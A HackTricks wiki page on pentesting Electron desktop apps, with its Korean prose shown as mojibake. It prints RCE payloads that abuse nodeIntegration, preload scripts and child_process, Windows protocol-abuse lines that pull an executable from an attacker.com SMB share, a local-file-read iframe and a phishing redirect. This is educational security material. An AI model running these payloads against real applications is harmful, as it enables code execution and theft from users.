# Electron Desktop Apps

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## Introduction

Electronì€ ë¡œì»¬ ë°±ì—”ë“œ(**NodeJS**)ì™€ í”„ë¡ íŠ¸ì—”ë“œ(**Chromium**)ë¥¼ ê²°í•©í•˜ì§€ë§Œ, í˜„ëŒ€ ë¸Œë¼ìš°ì €ì˜ ì¼ë¶€ ë³´ì•ˆ ë©”ì»¤ë‹ˆì¦˜ì´ ë¶€ì¡±í•©ë‹ˆë‹¤.

ì¼ë°˜ì ìœ¼ë¡œ ì „ì ì•± ì½”ë“œëŠ” `.asar` ì• í”Œë¦¬ì¼€ì´ì…˜ ë‚´ë¶€ì— ìˆì„ ìˆ˜ ìˆìœ¼ë©°, ì½”ë“œë¥¼ ì–»ìœ¼ë ¤ë©´ ì´ë¥¼ ì¶”ì¶œí•´ì•¼ í•©ë‹ˆë‹¤:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Electron ì•±ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ `packet.json` ì•ˆì— ë³´ì•ˆ ì„¤ì •ì´ ì§€ì •ëœ `main.js` íŒŒì¼ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electronì—ëŠ” 2ê°€ì§€ í”„ë¡œì„¸ìŠ¤ ìœ í˜•ì´ ìˆìŠµë‹ˆë‹¤:

* ë©”ì¸ í”„ë¡œì„¸ìŠ¤ (NodeJSì— ì™„ì „ ì ‘ê·¼ ê°€ëŠ¥)
* ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ (ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ NodeJS ì ‘ê·¼ì´ ì œí•œë˜ì–´ì•¼ í•¨)

![](<../../../.gitbook/assets/image (182).png>)

**ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤**ëŠ” íŒŒì¼ì„ ë¡œë“œí•˜ëŠ” ë¸Œë¼ìš°ì € ì°½ì´ ë  ê²ƒì…ë‹ˆë‹¤:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
Settings of the **renderer process** can be **configured** in the **main process** inside the main.js file. Some of the configurations will **prevent the Electron application to get RCE** or other vulnerabilities if the **settings are correctly configured**.

The electron application **could access the device** via Node apis although it can be configure to prevent it:

* **`nodeIntegration`** - ê¸°ë³¸ì ìœ¼ë¡œ `off`ì…ë‹ˆë‹¤. ë§Œì•½ ì¼œì ¸ ìˆë‹¤ë©´, ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ì—ì„œ ë…¸ë“œ ê¸°ëŠ¥ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **`contextIsolation`** - ê¸°ë³¸ì ìœ¼ë¡œ `on`ì…ë‹ˆë‹¤. êº¼ì ¸ ìˆë‹¤ë©´, ë©”ì¸ í”„ë¡œì„¸ìŠ¤ì™€ ë Œë”ëŸ¬ í”„ë¡œì„¸ìŠ¤ê°€ ê²©ë¦¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.
* **`preload`** - ê¸°ë³¸ì ìœ¼ë¡œ ë¹„ì–´ ìˆìŠµë‹ˆë‹¤.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - ê¸°ë³¸ì ìœ¼ë¡œ êº¼ì ¸ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” NodeJSê°€ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ì‘ì—…ì„ ì œí•œí•©ë‹ˆë‹¤.
* Node Integration in Workers
* **`nodeIntegrationInSubframes`** - ê¸°ë³¸ì ìœ¼ë¡œ `off`ì…ë‹ˆë‹¤.
* If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
* If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Example of configuration:
```javascript
const mainWindowOptions = {
title: 'Discord',
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true
}
};
```
ì¼ë¶€ **RCE payloads**ëŠ” [ì—¬ê¸°](https://7as.es/electron/nodeIntegration\_rce.txt)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());">

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('id').toString());">
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());">
```
### íŠ¸ë˜í”½ ìº¡ì²˜

start-main êµ¬ì„±ì„ ìˆ˜ì •í•˜ê³  ë‹¤ìŒê³¼ ê°™ì€ í”„ë¡ì‹œ ì‚¬ìš©ì„ ì¶”ê°€í•©ë‹ˆë‹¤:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron ë¡œì»¬ ì½”ë“œ ì£¼ì…

Electron ì•±ì„ ë¡œì»¬ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´ ì„ì˜ì˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆì„ ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤. ë°©ë²•ì€ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md" %}
[macos-electron-applications-injection.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md)
{% endcontent-ref %}

## RCE: XSS + nodeIntegration

**nodeIntegration**ì´ **on**ìœ¼ë¡œ ì„¤ì •ë˜ì–´ ìˆìœ¼ë©´, ì›¹ í˜ì´ì§€ì˜ ìë°”ìŠ¤í¬ë¦½íŠ¸ëŠ” `require()`ë¥¼ í˜¸ì¶œí•˜ê¸°ë§Œ í•˜ë©´ Node.js ê¸°ëŠ¥ì„ ì‰½ê²Œ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, Windowsì—ì„œ calc ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```html
<script>
require('child_process').exec('calc');
// or
top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

ì´ ì„¤ì •ì—ì„œ ì§€ì •ëœ ìŠ¤í¬ë¦½íŠ¸ëŠ” **ë Œë”ëŸ¬ì˜ ë‹¤ë¥¸ ìŠ¤í¬ë¦½íŠ¸ë³´ë‹¤ ë¨¼ì € ë¡œë“œ**ë˜ë¯€ë¡œ **Node APIì— ë¬´ì œí•œìœ¼ë¡œ ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
ë”°ë¼ì„œ, ìŠ¤í¬ë¦½íŠ¸ëŠ” node-featuresë¥¼ í˜ì´ì§€ë¡œ ë‚´ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}
```html
<body>
<script>
typeof require === 'undefined';
runCalc();
</script>
</body>
```
{% endcode %}

{% hint style="info" %}
**`contextIsolation`ì´ ì¼œì ¸ ìˆìœ¼ë©´, ì´ ë°©ë²•ì€ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**
{% endhint %}

## RCE: XSS + contextIsolation

_**contextIsolation**_ì€ **ì›¹ í˜ì´ì§€ ìŠ¤í¬ë¦½íŠ¸ì™€ JavaScript Electronì˜ ë‚´ë¶€ ì½”ë“œ ê°„ì˜ ë¶„ë¦¬ëœ ì»¨í…ìŠ¤íŠ¸**ë¥¼ ë„ì…í•˜ì—¬ ê° ì½”ë“œì˜ JavaScript ì‹¤í–‰ì´ ì„œë¡œ ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤. ì´ëŠ” RCEì˜ ê°€ëŠ¥ì„±ì„ ì œê±°í•˜ê¸° ìœ„í•œ í•„ìˆ˜ ê¸°ëŠ¥ì…ë‹ˆë‹¤.

ì»¨í…ìŠ¤íŠ¸ê°€ ê²©ë¦¬ë˜ì§€ ì•Šìœ¼ë©´ ê³µê²©ìëŠ”:

1. **ë Œë”ëŸ¬ì—ì„œ ì„ì˜ì˜ JavaScript ì‹¤í–‰** (XSS ë˜ëŠ” ì™¸ë¶€ ì‚¬ì´íŠ¸ë¡œì˜ íƒìƒ‰)
2. **í”„ë¦¬ë¡œë“œ ë˜ëŠ” Electron ë‚´ë¶€ ì½”ë“œì—ì„œ ì‚¬ìš©ë˜ëŠ” ë‚´ì¥ ë©”ì„œë“œ**ë¥¼ ìì‹ ì˜ í•¨ìˆ˜ë¡œ ë®ì–´ì“°ê¸°
3. **ë®ì–´ì“´ í•¨ìˆ˜ì˜ ì‚¬ìš©ì„ íŠ¸ë¦¬ê±°**
4. RCE?

ë‚´ì¥ ë©”ì„œë“œë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” ë‘ ê³³ì´ ìˆìŠµë‹ˆë‹¤: í”„ë¦¬ë¡œë“œ ì½”ë“œ ë˜ëŠ” Electron ë‚´ë¶€ ì½”ë“œ:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### í´ë¦­ ì´ë²¤íŠ¸ ìš°íšŒ

ë§í¬ë¥¼ í´ë¦­í•  ë•Œ ì œí•œì´ ì ìš©ëœë‹¤ë©´, ì¼ë°˜ ì™¼ìª½ í´ë¦­ ëŒ€ì‹  **ì¤‘ê°„ í´ë¦­**ì„ í†µí•´ ì´ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

ë” ë§ì€ ì •ë³´ëŠ” [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) ë° [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)ë¥¼ í™•ì¸í•˜ì„¸ìš”.

Electron ë°ìŠ¤í¬íƒ‘ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ë°°í¬í•  ë•Œ `nodeIntegration` ë° `contextIsolation`ì— ëŒ€í•œ ì˜¬ë°”ë¥¸ ì„¤ì •ì„ ë³´ì¥í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì„¤ì •ì´ ì ìš©ë˜ë©´ **í´ë¼ì´ì–¸íŠ¸ ì¸¡ ì›ê²© ì½”ë“œ ì‹¤í–‰ (RCE)**ì´ í”„ë¦¬ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ë‚˜ ë©”ì¸ í”„ë¡œì„¸ìŠ¤ì˜ Electron ë„¤ì´í‹°ë¸Œ ì½”ë“œë¥¼ ëŒ€ìƒìœ¼ë¡œ í•˜ëŠ” ê²ƒì„ íš¨ê³¼ì ìœ¼ë¡œ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì‚¬ìš©ìê°€ ë§í¬ì™€ ìƒí˜¸ì‘ìš©í•˜ê±°ë‚˜ ìƒˆ ì°½ì„ ì—´ë©´ íŠ¹ì • ì´ë²¤íŠ¸ ë¦¬ìŠ¤ë„ˆê°€ íŠ¸ë¦¬ê±°ë˜ë©°, ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆ ë° ê¸°ëŠ¥ì— ì¤‘ìš”í•©ë‹ˆë‹¤:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
ì´ ë¦¬ìŠ¤ë„ˆëŠ” **ë°ìŠ¤í¬íƒ‘ ì• í”Œë¦¬ì¼€ì´ì…˜ì— ì˜í•´ ì¬ì •ì˜ë˜ì–´** ìì²´ **ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§**ì„ êµ¬í˜„í•©ë‹ˆë‹¤. ì• í”Œë¦¬ì¼€ì´ì…˜ì€ íƒìƒ‰ëœ ë§í¬ê°€ ë‚´ë¶€ì—ì„œ ì—´ë ¤ì•¼ í•˜ëŠ”ì§€ ë˜ëŠ” ì™¸ë¶€ ì›¹ ë¸Œë¼ìš°ì €ì—ì„œ ì—´ë ¤ì•¼ í•˜ëŠ”ì§€ë¥¼ í‰ê°€í•©ë‹ˆë‹¤. ì´ ê²°ì •ì€ ì¼ë°˜ì ìœ¼ë¡œ `openInternally`ë¼ëŠ” í•¨ìˆ˜ë¥¼ í†µí•´ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ì´ í•¨ìˆ˜ê°€ `false`ë¥¼ ë°˜í™˜í•˜ë©´, ë§í¬ëŠ” ì™¸ë¶€ì—ì„œ ì—´ë ¤ì•¼ í•¨ì„ ë‚˜íƒ€ë‚´ë©°, `shell.openExternal` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

**ì—¬ê¸° ê°„ë‹¨í•œ ì˜ì‚¬ì½”ë“œê°€ ìˆìŠµë‹ˆë‹¤:**

![https://miro.medium.com/max/1400/1\*iqX26DMEr9RF7nMC1ANMAA.png](<../../../.gitbook/assets/image (261).png>)

![https://miro.medium.com/max/1400/1\*ZfgVwT3X1V\_UfjcKaAccag.png](<../../../.gitbook/assets/image (963).png>)

Electron JS ë³´ì•ˆ ëª¨ë²” ì‚¬ë¡€ëŠ” `openExternal` í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½˜í…ì¸ ë¥¼ ìˆ˜ìš©í•˜ì§€ ë§ ê²ƒì„ ê¶Œì¥í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ì–‘í•œ í”„ë¡œí† ì½œì„ í†µí•´ RCEë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš´ì˜ ì²´ì œëŠ” RCEë¥¼ ìœ ë°œí•  ìˆ˜ ìˆëŠ” ë‹¤ì–‘í•œ í”„ë¡œí† ì½œì„ ì§€ì›í•©ë‹ˆë‹¤. ì´ ì£¼ì œì— ëŒ€í•œ ìì„¸í•œ ì˜ˆì œì™€ ì¶”ê°€ ì„¤ëª…ì€ [ì´ ë¦¬ì†ŒìŠ¤](https://positive.security/blog/url-open-rce#windows-10-19042)ë¥¼ ì°¸ì¡°í•  ìˆ˜ ìˆìœ¼ë©°, ì´ ë¦¬ì†ŒìŠ¤ì—ëŠ” ì´ ì·¨ì•½ì ì„ ì•…ìš©í•  ìˆ˜ ìˆëŠ” Windows í”„ë¡œí† ì½œ ì˜ˆì œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

**Windows í”„ë¡œí† ì½œ ì•…ìš©ì˜ ì˜ˆëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:**
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>

<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update")
</script>

<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
## ë‚´ë¶€ íŒŒì¼ ì½ê¸°: XSS + contextIsolation

**`contextIsolation`ì„ ë¹„í™œì„±í™”í•˜ë©´ `<webview>` íƒœê·¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**, `<iframe>`ê³¼ ìœ ì‚¬í•˜ê²Œ, ë¡œì»¬ íŒŒì¼ì„ ì½ê³  ìœ ì¶œí•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì œê³µëœ ì˜ˆì‹œëŠ” ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ë‚´ë¶€ íŒŒì¼ì˜ ë‚´ìš©ì„ ì½ëŠ” ë°©ë²•ì„ ë³´ì—¬ì¤ë‹ˆë‹¤:

![](<../../../.gitbook/assets/1 u1jdRYuWAEVwJmf\_F2ttJg (1).png>)

ë˜í•œ, **ë‚´ë¶€ íŒŒì¼ì„ ì½ëŠ”** ë˜ ë‹¤ë¥¸ ë°©ë²•ì´ ê³µìœ ë˜ë©°, Electron ë°ìŠ¤í¬íƒ‘ ì•±ì—ì„œì˜ ì¤‘ìš”í•œ ë¡œì»¬ íŒŒì¼ ì½ê¸° ì·¨ì•½ì ì„ ê°•ì¡°í•©ë‹ˆë‹¤. ì´ëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì•…ìš©í•˜ê³  ë°ì´í„°ë¥¼ ìœ ì¶œí•˜ê¸° ìœ„í•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì£¼ì…í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤:
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Old Chromium**

ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‚¬ìš©ë˜ëŠ” **chromium**ì´ **ì˜¤ë˜ëœ** ê²½ìš°, **ì•Œë ¤ì§„** **ì·¨ì•½ì **ì´ ìˆì„ ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ **ì•…ìš©í•˜ì—¬ XSSë¥¼ í†µí•´ RCEë¥¼ ì–»ì„ ìˆ˜** ìˆìŠµë‹ˆë‹¤.\
ì´ **writeup**ì—ì„œ ì˜ˆì œë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

XSSë¥¼ ë°œê²¬í–ˆì§€ë§Œ **RCEë¥¼ íŠ¸ë¦¬ê±°í•˜ê±°ë‚˜ ë‚´ë¶€ íŒŒì¼ì„ í›”ì¹  ìˆ˜ ì—†ë‹¤ë©´**, ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ **í”¼ì‹±ì„ í†µí•´ ìê²© ì¦ëª…ì„ í›”ì¹˜ë ¤ê³  ì‹œë„í•  ìˆ˜** ìˆìŠµë‹ˆë‹¤.

ìš°ì„ , ìƒˆ URLì„ ì—´ë ¤ê³  í•  ë•Œ ì–´ë–¤ ì¼ì´ ë°œìƒí•˜ëŠ”ì§€ ì•Œì•„ì•¼ í•˜ë©°, í”„ë¡ íŠ¸ì—”ë“œì˜ JS ì½”ë“œë¥¼ í™•ì¸í•´ì•¼ í•©ë‹ˆë‹¤:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
**`openInternally`**ì— ëŒ€í•œ í˜¸ì¶œì€ **ë§í¬**ê°€ í”Œë«í¼ì— ì†í•˜ëŠ” ë§í¬ì´ê¸° ë•Œë¬¸ì— **ë°ìŠ¤í¬íƒ‘ ì°½**ì—ì„œ **ì—´ë¦´ì§€** ì•„ë‹ˆë©´ **ë¸Œë¼ìš°ì €ì—ì„œ 3rd party ë¦¬ì†ŒìŠ¤**ë¡œ ì—´ë¦´ì§€ë¥¼ ê²°ì •í•©ë‹ˆë‹¤.

í•¨ìˆ˜ê°€ ì‚¬ìš©í•˜ëŠ” **ì •ê·œ í‘œí˜„ì‹**ì´ **ìš°íšŒ ê³µê²©ì— ì·¨ì•½í•œ ê²½ìš°**(ì˜ˆ: **ì„œë¸Œë„ë©”ì¸ì˜ ì ì„ ì´ìŠ¤ì¼€ì´í”„í•˜ì§€ ì•ŠëŠ” ê²½ìš°**) ê³µê²©ìëŠ” XSSë¥¼ ì•…ìš©í•˜ì—¬ **ìƒˆ ì°½ì„ ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ ì°½ì€ ê³µê²©ìì˜ ì¸í”„ë¼ì— ìœ„ì¹˜í•˜ë©° **ì‚¬ìš©ìì—ê²Œ ìê²© ì¦ëª…ì„ ìš”ì²­**í•©ë‹ˆë‹¤:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **ë„êµ¬**

* [**Electronegativity**](https://github.com/doyensec/electronegativity)ëŠ” Electron ê¸°ë°˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì˜ëª»ëœ êµ¬ì„± ë° ë³´ì•ˆ ì•ˆí‹° íŒ¨í„´ì„ ì‹ë³„í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint)ëŠ” Electronegativityë¥¼ ì‚¬ìš©í•˜ëŠ” Electron ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìœ„í•œ ì˜¤í”ˆ ì†ŒìŠ¤ VS Code í”ŒëŸ¬ê·¸ì¸ì…ë‹ˆë‹¤.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan)ì€ ì·¨ì•½í•œ ì„œë“œíŒŒí‹° ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™•ì¸í•˜ëŠ” ë„êµ¬ì…ë‹ˆë‹¤.
* [**Electro.ng**](https://electro.ng/): êµ¬ë§¤í•´ì•¼ í•©ë‹ˆë‹¤.

## ì‹¤ìŠµ

[https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)ì—ì„œ ì·¨ì•½í•œ Electron ì•±ì„ ì•…ìš©í•˜ëŠ” ì‹¤ìŠµì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì‹¤ìŠµì— ë„ì›€ì´ ë  ëª‡ ê°€ì§€ ëª…ë ¹ì–´:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **References**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* Electron ë³´ì•ˆì— ëŒ€í•œ ë” ë§ì€ ì—°êµ¬ ë° ê¸€ì€ [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)ì—ì„œ í™•ì¸í•˜ì„¸ìš”.
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
